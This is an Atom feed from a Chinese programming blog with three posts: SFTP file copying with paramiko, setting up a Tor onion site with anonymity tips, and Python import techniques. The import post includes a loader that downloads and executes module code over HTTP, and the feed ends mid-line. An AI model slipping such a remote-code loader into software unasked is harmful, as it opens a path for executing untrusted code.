<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cat++</title>
  
  <subtitle>看见我的猫粮吗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://c.cat.plus/"/>
  <updated>2020-07-03T13:43:23.504Z</updated>
  <id>http://c.cat.plus/</id>
  
  <author>
    <name>Cat</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python复制远程文件及文件目录到本地</title>
    <link href="http://c.cat.plus/2019/01/15/Python/Python%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%B0%E6%9C%AC%E5%9C%B0/"/>
    <id>http://c.cat.plus/2019/01/15/Python/Python%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%B0%E6%9C%AC%E5%9C%B0/</id>
    <published>2019-01-14T16:01:00.000Z</published>
    <updated>2020-07-03T13:43:23.504Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>paramiko是用python写的一个模块，遵循SSH2协议，支持以加密和认证的方式，进行远程服务器的连接。利用该模块，可以方便的进行ssh连接和sftp协议进行sftp文件传输以及远程命令执行,常用于python运维开发；</p><ul><li><p><strong>paramiko 模块内部依赖pycrypto，所以先导入pycrypto</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycrypto</span><br><span class="line">pip3 install paramiko</span><br></pre></td></tr></table></figure></li></ul></li><li><p>定义一个方法，用于远程复制文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoteScp</span><span class="params">(host_ip, host_port, host_username, host_password, remote_file, local_file)</span>:</span></span><br><span class="line">    scp = paramiko.Transport((host_ip, host_port))</span><br><span class="line">    scp.connect(username=host_username, password=host_password)</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(scp)</span><br><span class="line">    sftp.get(remote_file, local_file)</span><br><span class="line">    scp.close()</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">"success"</span>)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">**注意这里的语句**</span><br><span class="line">`sftp.get(remote_file, local_file)` 中自带的get方法，只能拷贝文件，不能拷贝文件夹。</span><br><span class="line"></span><br><span class="line">* 然后调用这个方法：</span><br><span class="line">```python</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host_ip = <span class="string">'192.168.1.123'</span></span><br><span class="line">    host_port = <span class="number">22</span></span><br><span class="line">    host_username = <span class="string">'root'</span></span><br><span class="line">    host_password = <span class="string">'password'</span></span><br><span class="line">    remote_path = <span class="string">'/tmp/test.sql'</span></span><br><span class="line">    local_path = <span class="string">'/tmp/test.sql'</span></span><br><span class="line">    RemoteScp(host_ip, host_port, host_username, host_password, remote_path, local_path)</span><br></pre></td></tr></table></figure></li></ul><p>这就是基本远程文件复制的功能实现。这里只能实现文件对文件的远程复制。</p><p>如果我们要远程复制整个文件夹。需要对上面的方法改进一下，加一段循环，让其能遍历远程目录里的所有文件，然后按照上面的方法依次复制到本地。</p><blockquote><p><strong>修改以后的完整代码如下</strong>:</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoteScp</span><span class="params">(host_ip, host_port, host_username, host_password, remote_path, local_path)</span>:</span></span><br><span class="line">    scp = paramiko.Transport((host_ip, host_port))</span><br><span class="line">    scp.connect(username=host_username, password=host_password)</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(scp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        remote_files = sftp.listdir(remote_path)</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> remote_files:   <span class="comment">#遍历读取远程目录里的所有文件</span></span><br><span class="line">            local_file = local_path + file</span><br><span class="line">            remote_file = remote_path + file</span><br><span class="line">            sftp.get(remote_file, local_file)</span><br><span class="line">    <span class="keyword">except</span> IOError:   <span class="comment">#  如果目录不存在则抛出异常</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"remote_path or local_path is not exist"</span>)</span><br><span class="line">    scp.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host_ip = <span class="string">'192.168.1.123'</span>        <span class="comment"># 远程服务器IP</span></span><br><span class="line">    host_port = <span class="number">22</span>                   <span class="comment"># 远程服务器端口</span></span><br><span class="line">    host_username = <span class="string">'root'</span>           <span class="comment">#远程服务器用户名</span></span><br><span class="line">    host_password = <span class="string">'password'</span>       <span class="comment">#远程服务器密码</span></span><br><span class="line">    remote_path = <span class="string">'/tmp/'</span>            <span class="comment">#这个是远程目录</span></span><br><span class="line">    local_path = <span class="string">'/tmp/'</span>             <span class="comment">#这个是本地目录</span></span><br><span class="line">    RemoteScp(host_ip, host_port, host_username, host_password, remote_path, local_path)  <span class="comment">#调用方法</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;paramiko是用python写的一个模块，遵循SSH2协议，支持以加密和认证的方式，进行远程服务器的连接。利用该模块，可以方便的进行ssh连接和sftp协议进行sftp文件传输以及远程命令执行,常用于python运维开发；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;
      
    
    </summary>
    
    
      <category term="python" scheme="http://c.cat.plus/categories/python/"/>
    
      <category term="python运维" scheme="http://c.cat.plus/categories/python/python%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="paramiko" scheme="http://c.cat.plus/tags/paramiko/"/>
    
  </entry>
  
  <entry>
    <title>暗网网站搭建和onion域名获取方法</title>
    <link href="http://c.cat.plus/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/</id>
    <published>2018-06-12T13:22:53.000Z</published>
    <updated>2020-06-16T09:18:26.626Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="tor项目"><a href="#tor项目" class="headerlink" title="tor项目"></a><strong>tor项目</strong></h3><p>tor项目是美国海军的秘密项目，之后被开源用于真正的匿名网络中。在tor的网络中，你的真实的ip地址和其他和你有关的任何暴露于互联网的信息都会被隐藏，真正保护了用户。tor项目不但为一般用户提供客户端，同时也提供了.onion域名和服务，利用.onion域名可以把你网站的真正地址隐藏起来。</p></blockquote><h4 id="暗网网站搭建准备材料"><a href="#暗网网站搭建准备材料" class="headerlink" title="暗网网站搭建准备材料"></a><strong>暗网网站搭建准备材料</strong></h4><ul><li>服务器或本机内网映射</li><li>网站搭建相关技术</li></ul><p><strong>服务器选择</strong></p><p>如何你想真正隐藏自己，你需要做以下步骤</p><ul><li>建议使用Debian或者Ubuntu的服务器，tor官方文档支持较好</li><li>服务器只用来做tor网站不做其他的任何东西</li><li>匿名支付购买服务器</li><li>不要在服务器上运行 Tor 中继，因为 Tor 中继的ip是暴露的</li><li>不要接受和发送电子邮件</li></ul><p><strong>网站配置</strong></p><ul><li><p>安装nginx或者apache，这里以nginx为例（nginx的使用最为广泛）</p></li><li><p>编辑nginx配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">listen   127.0.0.1:xxxx;#xxxx是你的端口号 不要设置成80为了安全</span><br><span class="line"></span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sudo service nginx restart#重启服务</span><br></pre></td></tr></table></figure></li><li><p>以Debian服务器搭建暗网网站为例</p></li></ul><h4 id="Tor服务安装"><a href="#Tor服务安装" class="headerlink" title="Tor服务安装"></a><strong>Tor服务安装</strong></h4><ul><li>一般可以通过apt直接安装tor服务 <code>apt install tor</code></li></ul><p>如果不行请进行以下操作</p><ol><li><p>修改source.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line">最后加下面这两行</span><br><span class="line">deb https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org stretch main</span><br><span class="line">deb-src https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org stretch main</span><br></pre></td></tr></table></figure></li><li><p>添加密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org&#x2F;A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import</span><br><span class="line">gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -</span><br></pre></td></tr></table></figure></li><li><p>安装tor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">sudo apt-get install tor</span><br></pre></td></tr></table></figure></li><li><p>dns选择</p><p> 默认是deb.torproject.org<br> 备选的有deb-master.torproject.org、mirror.netcologne.de、tor.mirror.youam.de</p></li><li><p>编辑tor配置文件</p><p> vi /etc/tor/torrc<br> 添加<br> HiddenServiceDir /var/lib/tor/hidden_service/<br> HiddenServicePort 80 127.0.0.1:8080</p></li><li><p>启动tor</p><p> <code>sudo service tor start</code><br> 一旦启动，那么你的域名也就生成了</p></li><li><p>查看onion域名</p><p> cat /var/lib/tor/hidden_service/hostname</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;tor项目&quot;&gt;&lt;a href=&quot;#tor项目&quot; class=&quot;headerlink&quot; title=&quot;tor项目&quot;&gt;&lt;/a&gt;&lt;strong&gt;tor项目&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;tor项目是美国海军的秘密项目，之后被开源用于真正的匿名
      
    
    </summary>
    
    
      <category term="Darknet" scheme="http://c.cat.plus/categories/Darknet/"/>
    
    
      <category term="暗网" scheme="http://c.cat.plus/tags/%E6%9A%97%E7%BD%91/"/>
    
      <category term="onion" scheme="http://c.cat.plus/tags/onion/"/>
    
      <category term="tor" scheme="http://c.cat.plus/tags/tor/"/>
    
  </entry>
  
  <entry>
    <title>Python花式导包的几种方法</title>
    <link href="http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2018-03-14T17:01:00.000Z</published>
    <updated>2020-07-03T13:42:13.396Z</updated>
    
    <content type="html"><![CDATA[<p>今天跟大家分享 8 种导入模块的方法。</p><p>直接 import<br>人尽皆知的方法，直接导入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>与此类似的还有，不再细讲</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br></pre></td></tr></table></figure><p>一般情况下，使用 import 语句导入模块已经够用的。</p><p>但是在一些特殊场景中，可能还需要其他的导入方式。</p><p>下面我会一一地给你介绍。</p><p>使用 <strong>import</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__ 函数可用于导入模块，<span class="keyword">import</span> 语句也会调用函数。其定义为：</span><br><span class="line"></span><br><span class="line">__import__(name[, globals[, locals[, fromlist[, level]]]])</span><br></pre></td></tr></table></figure><p>参数介绍：</p><p>name (required): 被加载 module 的名称</p><p>globals (optional): 包含全局变量的字典，该选项很少使用，采用默认值 global()</p><p>locals (optional): 包含局部变量的字典，内部标准实现未用到该变量，采用默认值 - local()</p><p>fromlist (Optional): 被导入的 submodule 名称</p><p>level (Optional): 导入路径选项，Python 2 中默认为 -1，表示同时支持 absolute import 和 relative import。Python 3 中默认为 0，表示仅支持 absolute import。如果大于 0，则表示相对导入的父目录的级数，即 1 类似于 ‘.’，2 类似于 ‘..’。</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy 的效果，只要修改左值即可</p><p>如下示例，等价于 import os as myos：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 importlib<br>importlib 是 Python 中的一个标准库，importlib 能提供的功能非常全面。</p><p>它的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos=importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy效果，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 imp<br>imp 模块提供了一些 import 语句内部实现的接口。例如模块查找（find_module）、模块加载（load_module）等等（模块的导入过程会包含模块查找、加载、缓存等步骤）。可以用该模块来简单实现内建的 <strong>import</strong> 函数功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file, pathname, desc = imp.find_module(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = imp.load_module(<span class="string">'sep'</span>, file, pathname, desc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos</span><br><span class="line">&lt;module <span class="string">'sep'</span> <span class="keyword">from</span> <span class="string">'/usr/lib64/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>从 python 3 开始，内建的 reload 函数被移到了 imp 模块中。而从 Python 3.4 开始，imp 模块被否决，不再建议使用，其包含的功能被移到了 importlib 模块下。即从 Python 3.4 开始，importlib 模块是之前 imp 模块和 importlib 模块的合集。</p><p>使用 execfile<br>在 Python 2 中有一个 execfile 函数，利用它可以用来执行一个文件。</p><p>语法如下：</p><p>execfile(filename[, globals[, locals]])</p><p>参数有这么几个：</p><p>filename：文件名。</p><p>globals：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</p><p>locals：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">"/usr/lib64/python2.7/os.py"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 exec<br>execfile 只能在 Python2 中使用，Python 3.x 里已经删除了这个函数。</p><p>但是原理值得借鉴，你可以使用 open … read  读取文件内容，然后再用 exec 去执行模块。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"/usr/lib64/python2.7/os.py"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    exec(f.read())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>import_from_github_com<br>有一个包叫做 import_from_github_com，从名字上很容易得知，它是一个可以从 github 下载安装并导入的包。为了使用它，你需要做的就是按照如下命令使用pip 先安装它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install import_from_github_com</span><br></pre></td></tr></table></figure><p>这个包使用了PEP 302中新的引入钩子，允许你可以从github上引入包。这个包实际做的就是安装这个包并将它添加到本地。你需要 Python 3.2 或者更高的版本，并且 git 和 pip 都已经安装才能使用这个包。</p><p>pip 要保证是较新版本，如果不是请执行如下命令进行升级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>确保环境 ok 后，你就可以在 Python shell 中使用 import_from_github_com</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> github_com.zzzeek <span class="keyword">import</span> sqlalchemy</span><br><span class="line">Collecting git+https://github.com/zzzeek/sqlalchemy</span><br><span class="line">Cloning https://github.com/zzzeek/sqlalchemy to /tmp/pip-acfv7t06-build</span><br><span class="line">Installing collected packages: SQLAlchemy</span><br><span class="line">Running setup.py install <span class="keyword">for</span> SQLAlchemy ... done</span><br><span class="line">Successfully installed SQLAlchemy<span class="number">-1.1</span><span class="number">.0</span>b1.dev0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>,</span><br><span class="line"><span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>,</span><br><span class="line"><span class="string">'sqlalchemy'</span>: &lt;module <span class="string">'sqlalchemy'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python3.5/site-packages/\</span></span><br><span class="line"><span class="string">sqlalchemy/__init__.py'</span>&gt;,</span><br><span class="line"><span class="string">'__loader__'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">_frozen_importlib</span>.<span class="title">BuiltinImporter</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>看了 import_from_github_com的源码后，你会注意到它并没有使用importlib。实际上，它的原理就是使用 pip 来安装那些没有安装的包，然后使用Python的<strong>import</strong>()函数来引入新安装的模块。</p><p>远程导入模块<br>我在这篇文章里（深入探讨 Python 的 import 机制：实现远程导入模块），深入剖析了导入模块的内部原理，并在最后手动实现了从远程服务器上读取模块内容，并在本地成功将模块导入的导入器。</p><p>具体内容非常的多，你可以点击这个链接进行深入学习。</p><p>示例代码如下：</p><h1 id="新建一个-py-文件（my-importer-py），内容如下"><a href="#新建一个-py-文件（my-importer-py），内容如下" class="headerlink" title="新建一个 py 文件（my_importer.py），内容如下"></a>新建一个 py 文件（my_importer.py），内容如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaFinder</span><span class="params">(importlib.abc.MetaPathFinder)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self._baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            baseurl = self._baseurl</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不是原定义的url就直接返回不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(self._baseurl):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            baseurl = path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            loader = UrlMetaLoader(baseurl)</span><br><span class="line">            <span class="keyword">return</span> loader</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaLoader</span><span class="params">(importlib.abc.SourceLoader)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self.baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        f = urllib2.urlopen(self.get_filename(fullname))</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.baseurl + fullname + <span class="string">'.py'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_meta</span><span class="params">(address)</span>:</span></span><br><span class="line">    finder = UrlMetaFinder(address)</span><br><span class="line">    sys.meta_path.append(finder)</span><br></pre></td></tr></table></figure><p>并且在远程服务器上开启 http 服务（为了方便，我仅在本地进行演示），并且手动编辑一个名为 my_info 的 python 文件，如果后面导入成功会打印 ok。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir httpserver &amp;&amp; cd httpserver</span><br><span class="line">$ cat&gt;my_info.py&lt;EOF</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">EOF</span><br><span class="line">$ cat my_info.py</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">$</span><br><span class="line">$ python3 -m http.server <span class="number">12800</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">12800</span> (http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">12800</span>/) ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一切准备好，验证开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> my_importer <span class="keyword">import</span> install_meta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>install_meta(<span class="string">'http://localhost:12800/'</span>) <span class="comment"># 往 sys.meta_path 注册 finder</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> my_info  <span class="comment"># 打印ok，说明导入成功</span></span><br><span class="line">ok</span><br><span 